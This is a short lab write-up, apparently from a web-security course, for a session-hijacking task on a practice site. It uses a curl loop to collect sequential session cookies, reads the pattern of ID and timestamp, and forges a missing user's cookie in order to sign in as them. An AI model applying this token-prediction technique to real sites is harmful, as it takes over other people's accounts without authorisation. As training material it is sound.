### Task 0: 
Added the ip address and url to /etc/hosts file
Run the open vpn command and leave it running
Access the site at: "http://web0x01.hbtn/a1/hijack_session"

Check the cookie value in dev tools. Take note of the cookie value. Clear cookies from history and refresh. Take note of the new cookie value. Do this multiple times. 
We can see that the value is increasing but manually it is to slow to see a pattern.

Use this command to send a request to the website  multiple times:
for i in {1..20}; do curl -s -I http://web0x01.hbtn/a1/hijack_session/ | awk '/hijack_session/ {print $2}'; done

Below are the results:

hijack_session=875dcb30-aac1-48da-af5-4569673-17253709219;
hijack_session=875dcb30-aac1-48da-af5-4569675-17253709222;
hijack_session=875dcb30-aac1-48da-af5-4569676-17253709224;
hijack_session=875dcb30-aac1-48da-af5-4569677-17253709226;
hijack_session=875dcb30-aac1-48da-af5-4569678-17253709228;
hijack_session=875dcb30-aac1-48da-af5-4569679-17253709230;
hijack_session=875dcb30-aac1-48da-af5-4569680-17253709232;
hijack_session=875dcb30-aac1-48da-af5-4569681-17253709233;
hijack_session=875dcb30-aac1-48da-af5-4569682-17253709235;
hijack_session=875dcb30-aac1-48da-af5-4569683-17253709237;
hijack_session=875dcb30-aac1-48da-af5-4569684-17253709239; notice that the 4569685 should be next but it is missing. 
hijack_session=875dcb30-aac1-48da-af5-4569686-17253709242;
hijack_session=875dcb30-aac1-48da-af5-4569687-17253709244;
hijack_session=875dcb30-aac1-48da-af5-4569688-17253709246;
hijack_session=875dcb30-aac1-48da-af5-4569689-17253709248;
hijack_session=875dcb30-aac1-48da-af5-4569690-17253709250;
hijack_session=875dcb30-aac1-48da-af5-4569691-17253709251;
hijack_session=875dcb30-aac1-48da-af5-4569692-17253709253;
hijack_session=875dcb30-aac1-48da-af5-4569693-17253709255;
hijack_session=875dcb30-aac1-48da-af5-4569694-17253709257;

The last part of the value (17253709224, etc) is a timestamp. 

This value (4569685, etc) is a some kind of session identifier for each connection to the website. 

You can work out the someone else connected to the website that between these two cookies:

hijack_session=875dcb30-aac1-48da-af5-4569684-17253709239;
hijack_session=875dcb30-aac1-48da-af5-4569686-17253709242;

The cookie they used is one of these two: session incremented and then time incremented.

875dcb30-aac1-48da-af5-4569685-17253709240
875dcb30-aac1-48da-af5-4569685-17253709241

Add the cookie the browser, add an any email and password to fields. Click on sign in. The email should be properly formatted (email@email.com)

